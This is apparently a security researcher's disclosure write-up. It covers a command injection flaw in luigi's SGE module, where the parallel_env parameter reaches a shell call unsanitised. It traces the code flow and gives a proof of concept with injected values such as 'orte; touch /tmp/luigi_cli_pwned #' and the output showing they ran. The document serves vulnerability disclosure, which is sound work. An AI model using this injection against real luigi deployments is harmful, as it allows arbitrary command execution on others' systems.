# Luigi SGE Command Injection Analysis

## Package Information

| Field      | Value                            |
| ---------- | -------------------------------- |
| Package    | luigi                            |
| PyPI       | https://pypi.org/project/luigi/  |
| GitHub     | https://github.com/spotify/luigi |
| Maintainer | Spotify                          |
| File       | `luigi/contrib/sge.py`           |

---

## Summary

This document outlines a potential command injection vulnerability in luigi's SGE module. User-controlled parameters are passed to `subprocess.check_output()` with `shell=True` and no sanitization.

---

## Source (User Input)
```python
parallel_env = luigi.Parameter(default='orte', significant=False)
```

`luigi.Parameter()` allows users to set this via:
- Config file (`luigi.cfg`)
- Command line
- Code

---

## Sink (Dangerous Function)
```python
output = subprocess.check_output(submit_cmd, shell=True)
```

---

## Static Analysis (Vulnerable Code Flow)

### Step 1: User sets parameter
```python
parallel_env = 'orte"; touch /tmp/pwned #'
```

### Step 2: Parameter passed to command builder
```python
submit_cmd = _build_qsub_command(
    job_str, 
    self.task_family, 
    self.outfile,
    self.errfile, 
    self.parallel_env,  # <-- User input
    self.n_cpu
)
```

### Step 3: Command built with no sanitization
```python
def _build_qsub_command(cmd, job_name, outfile, errfile, pe, n_cpu):
    qsub_template = """echo {cmd} | qsub -o ":{outfile}" -e ":{errfile}" -V -r y -pe {pe} {n_cpu} -N {job_name}"""
    return qsub_template.format(
        cmd=cmd, 
        job_name=job_name, 
        outfile=outfile, 
        errfile=errfile,
        pe=pe,  # <-- Inserted directly, no sanitization
        n_cpu=n_cpu
    )
```

### Step 4: Command executed with shell=True
```python
output = subprocess.check_output(submit_cmd, shell=True)
```

### Dynamic Analysis

```python
import luigi  
  
class MyTask(luigi.Task):  
   name = luigi.Parameter(default='world')  
  
   def output(self):  
       return luigi.LocalTarget(f'/tmp/hello_{self.name}.txt')  
  
   def run(self):  
       with self.output().open('w') as f:  
           f.write(f'Hello, {self.name}!\n')  
  
if __name__ == '__main__':  
   luigi.build([MyTask()], local_scheduler=True)
```


```
python test_luigi.py MyTask --name Marcos
```

- `name` = `'Marcos'` (from command line)
- Creates `/tmp/hello_Marcos.txt`
- File contains: `Hello, Marcos!`
- 
- ## Visual Flow
```python
python test_luigi.py MyTask --name Marcos 
```
```
- `name` = `'Marcos'` (from command line) 
- Creates `/tmp/hello_Marcos.txt` 
- File contains: `Hello, Marcos!` 

┌─────────────────────────────┐
│ name = luigi.Parameter()    │ ← User sets via CLI or config
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ output() → /tmp/hello_X.txt │ ← Where to save
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ run() → Write "Hello, X!"   │ ← Does the work
└─────────────────────────────┘
```

---  
  
# # Subprocess Behavior Validation

Before testing Luigi's SGE integration directly, subprocess behavior was validated in isolation to confirm how the usage of`shell=True` interprets input and metacharacters using the code flow of the real project.

---

## 1. Basic Command Execution

First we confirm that `subprocess.check_output` actually executes commands correctly with `shell=True`.

python

```python
import subprocess

output = subprocess.check_output("echo hello", shell=True)
print(output.decode())
```

**Output:**
This shows us that the subprocess in fact does run the command

```
hello
```

---

## 2. Metacharacter Interpretation

Next we verify  that shell metacharacters (`;`) are interpreted, allowing us to run a malicious extra command.

python

```python
import subprocess

output = subprocess.check_output("echo hello; echo injected", shell=True)
print(output.decode())
```

**Output:**
Here we can see that both commands are executed and we should be able to add an extra command and have it run
```
hello
injected
```

---

## 3. Simulated Injection via Luigi-Style Code Structure

Next we use the same pattern as Luigi's SGE task runner, where we inject a malicious value into the `-pe` (parallel environment) argument to see if it breaks out and runs the command we provided.

python

```python
import subprocess

pe = 'orte; echo Injected'

cmd = f"echo job | qsub -pe {pe} 4"
print(cmd)

subprocess.check_output(cmd, shell=True)
```

**Constructed command:**

```
echo job | qsub -pe orte; echo Injected 4
```

**Output:**
Here we can see that the command was successfully run and Injected was printed to the console. 
```
/bin/sh: 1: qsub: not found
Injected 4
```

---

# Proof of Concept

With subprocess behavior confirmed, the next step was to test against Luigi's actual code and not a simulation.

## End-to-End via Luigi CLI

A developer writes a normal `SGEJobTask` subclass. An attacker passes `--parallel-env` on the command line.

Below is shown howLuigi builds the qsub command inside `_build_qsub_command()` using `str.format()`:

```python
qsub_template = """echo {cmd} | qsub -o ":{outfile}" -e ":{errfile}" -V -r y -pe {pe} {n_cpu} -N {job_name}"""
return qsub_template.format(..., pe=pe, ...)
```

Whatever is in `parallel_env` gets placed into `-pe {pe}` with no validation. The result is passed to `subprocess.check_output(submit_cmd, shell=True)` which is a dangerous function that can lead to arbitrary code execution. 

**Normal command (parallel_env='orte'):**
Below is an example of normal usage
```
echo python runner.py /tmp/task | qsub -o ":/tmp/task/job.out" -e ":/tmp/task/job.err" -V -r y -pe orte 2 -N VulnerableTask
```
**Task script (`test_scripts/test_sge_cli.py`):**
Below is a basic script for an SGE Task.
```python
class VulnerableTask(SGEJobTask):
    def work(self): pass
    def output(self): return luigi.LocalTarget('/tmp/vulnerable_task_output')
```

**CLI invocation with injected parameter:**
Below is shown ab example malicous inject where a file is created in the /tmp directory through the luigi script.
```bash
python3 test_sge_cli.py VulnerableTask \
    --parallel-env 'orte; touch /tmp/luigi_cli_pwned #' \
    --local-scheduler
```

The `;` terminates the `qsub` call early. `touch /tmp/luigi_cli_pwned` runs as a separate shell command. The `#` comments out the remaining arguments (`2 -N VulnerableTask`).

**Full output:**
```
INFO: [pid 18066] Worker ... running   VulnerableTask()
DEBUG: qsub command:
echo python .../sge_runner.py "/tmp/tmpb8vqr606" "..." | qsub -o ":/tmp/tmpb8vqr606/job.out" -e ":/tmp/tmpb8vqr606/job.err" -V -r y -pe orte; touch /tmp/luigi_cli_pwned # 2 -N VulnerableTask
/bin/sh: 1: qsub: not found
ERROR: [pid 18066] Worker ... failed    VulnerableTask()
Traceback (most recent call last):
  File ".../sge.py", line 257, in run
    self._run_job()
  File ".../sge.py", line 304, in _run_job
    self.job_id = _parse_qsub_job_id(output)
IndexError: list index out of range

===== Luigi Execution Summary =====
* 1 failed:
    - 1 VulnerableTask(...)
```

```bash
$ ls /tmp/luigi_cli_pwned
/tmp/luigi_cli_pwned   ← proof file created by the injected command
```

The output confirms that the payload executed despite Luigi reporting the task as failed.
